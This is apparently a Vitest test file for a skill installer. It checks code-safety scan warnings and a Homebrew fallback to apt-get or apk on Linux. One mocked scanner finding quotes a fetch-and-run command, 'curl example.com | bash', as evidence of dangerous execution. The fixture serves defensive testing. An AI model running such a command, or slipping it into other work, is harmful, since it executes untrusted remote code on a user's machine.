import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { installSkill } from "./skills-install.js";

const runCommandWithTimeoutMock = vi.fn();
const scanDirectoryWithSummaryMock = vi.fn();

vi.mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../security/skill-scanner.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../security/skill-scanner.js")>();
  return {
    ...actual,
    scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
  };
});

async function writeInstallableSkill(workspaceDir: string, name: string): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"openclaw":{"install":[{"id":"deps","kind":"node","package":"example-package"}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

describe("installSkill code safety scanning", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockReset();
    scanDirectoryWithSummaryMock.mockReset();
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
  });

  it("adds detailed warnings for critical findings and continues install", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("warns and continues when skill scan fails", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      await writeInstallableSkill(workspaceDir, "scanfail-skill");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("code safety scan failed"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("Installation continues"))).toBe(
        true,
      );
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });
});

const detectLinuxPackageManagerMock = vi.fn();
const resolveLinuxPackageNameMock = vi.fn();
const buildLinuxInstallCommandMock = vi.fn();

vi.mock("../infra/linux-package-manager.js", () => ({
  detectLinuxPackageManager: (...args: unknown[]) => detectLinuxPackageManagerMock(...args),
  resolveLinuxPackageName: (...args: unknown[]) => resolveLinuxPackageNameMock(...args),
  buildLinuxInstallCommand: (...args: unknown[]) => buildLinuxInstallCommandMock(...args),
}));

async function writeBrewSkill(
  workspaceDir: string,
  name: string,
  formula: string,
  extra?: { apt?: string; apk?: string },
): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  const spec: Record<string, unknown> = {
    id: "brew-dep",
    kind: "brew",
    formula,
    bins: [name],
    label: `Install ${name} (brew)`,
  };
  if (extra?.apt) {
    spec.apt = extra.apt;
  }
  if (extra?.apk) {
    spec.apk = extra.apk;
  }
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test brew skill
metadata: {"openclaw":{"install":[${JSON.stringify(spec)}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

describe("installSkill brew fallback on Linux", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockReset();
    scanDirectoryWithSummaryMock.mockReset();
    detectLinuxPackageManagerMock.mockReset();
    resolveLinuxPackageNameMock.mockReset();
    buildLinuxInstallCommandMock.mockReset();
    scanDirectoryWithSummaryMock.mockResolvedValue({
      scannedFiles: 0,
      critical: 0,
      warn: 0,
      info: 0,
      findings: [],
    });
  });

  it("falls back to apt-get when brew is unavailable on Linux", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-brew-fallback-"));
    try {
      await writeBrewSkill(workspaceDir, "ffmpeg-skill", "ffmpeg");

      detectLinuxPackageManagerMock.mockReturnValue("apt-get");
      resolveLinuxPackageNameMock.mockReturnValue("ffmpeg");
      buildLinuxInstallCommandMock.mockReturnValue(["apt-get", "install", "-y", "ffmpeg"]);
      runCommandWithTimeoutMock.mockResolvedValue({
        code: 0,
        stdout: "installed ffmpeg",
        stderr: "",
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "ffmpeg-skill",
        installId: "brew-dep",
      });

      expect(result.ok).toBe(true);
      expect(result.message).toBe("Installed via apt-get");
      expect(runCommandWithTimeoutMock).toHaveBeenCalledWith(
        ["apt-get", "install", "-y", "ffmpeg"],
        expect.objectContaining({ timeoutMs: expect.any(Number) }),
      );
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("falls back to apk on Alpine when brew is unavailable", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-brew-fallback-"));
    try {
      await writeBrewSkill(workspaceDir, "jq-skill", "jq");

      detectLinuxPackageManagerMock.mockReturnValue("apk");
      resolveLinuxPackageNameMock.mockReturnValue("jq");
      buildLinuxInstallCommandMock.mockReturnValue(["apk", "add", "--no-cache", "jq"]);
      runCommandWithTimeoutMock.mockResolvedValue({
        code: 0,
        stdout: "installed jq",
        stderr: "",
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "jq-skill",
        installId: "brew-dep",
      });

      expect(result.ok).toBe(true);
      expect(result.message).toBe("Installed via apk");
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("returns helpful error for tap formula with no Linux mapping", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-brew-fallback-"));
    try {
      await writeBrewSkill(workspaceDir, "summarize-skill", "steipete/tap/summarize");

      detectLinuxPackageManagerMock.mockReturnValue("apt-get");
      resolveLinuxPackageNameMock.mockReturnValue(undefined);

      const result = await installSkill({
        workspaceDir,
        skillName: "summarize-skill",
        installId: "brew-dep",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain("no apt-get equivalent");
      expect(result.message).toContain("steipete/tap/summarize");
      expect(result.message).toContain("Install Homebrew or the package manually");
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("reports failure when Linux package manager install fails", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-brew-fallback-"));
    try {
      await writeBrewSkill(workspaceDir, "ffmpeg-skill", "ffmpeg");

      detectLinuxPackageManagerMock.mockReturnValue("apt-get");
      resolveLinuxPackageNameMock.mockReturnValue("ffmpeg");
      buildLinuxInstallCommandMock.mockReturnValue(["apt-get", "install", "-y", "ffmpeg"]);
      runCommandWithTimeoutMock.mockResolvedValue({
        code: 1,
        stdout: "",
        stderr: "E: Unable to locate package ffmpeg",
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "ffmpeg-skill",
        installId: "brew-dep",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain("Install failed");
      expect(result.stderr).toContain("Unable to locate package");
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("still returns 'brew not installed' when no Linux package manager is found", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-brew-fallback-"));
    try {
      await writeBrewSkill(workspaceDir, "ffmpeg-skill", "ffmpeg");

      detectLinuxPackageManagerMock.mockReturnValue(undefined);

      const result = await installSkill({
        workspaceDir,
        skillName: "ffmpeg-skill",
        installId: "brew-dep",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toBe("brew not installed");
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("uses explicit apt field from spec for brew formula mapping", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-brew-fallback-"));
    try {
      await writeBrewSkill(workspaceDir, "custom-skill", "custom/tap/tool", {
        apt: "custom-tool-apt",
      });

      detectLinuxPackageManagerMock.mockReturnValue("apt-get");
      resolveLinuxPackageNameMock.mockReturnValue("custom-tool-apt");
      buildLinuxInstallCommandMock.mockReturnValue(["apt-get", "install", "-y", "custom-tool-apt"]);
      runCommandWithTimeoutMock.mockResolvedValue({
        code: 0,
        stdout: "installed",
        stderr: "",
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "custom-skill",
        installId: "brew-dep",
      });

      expect(result.ok).toBe(true);
      expect(result.message).toBe("Installed via apt-get");
      expect(resolveLinuxPackageNameMock).toHaveBeenCalledWith(
        "apt-get",
        "custom/tap/tool",
        expect.objectContaining({ apt: "custom-tool-apt" }),
      );
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });
});
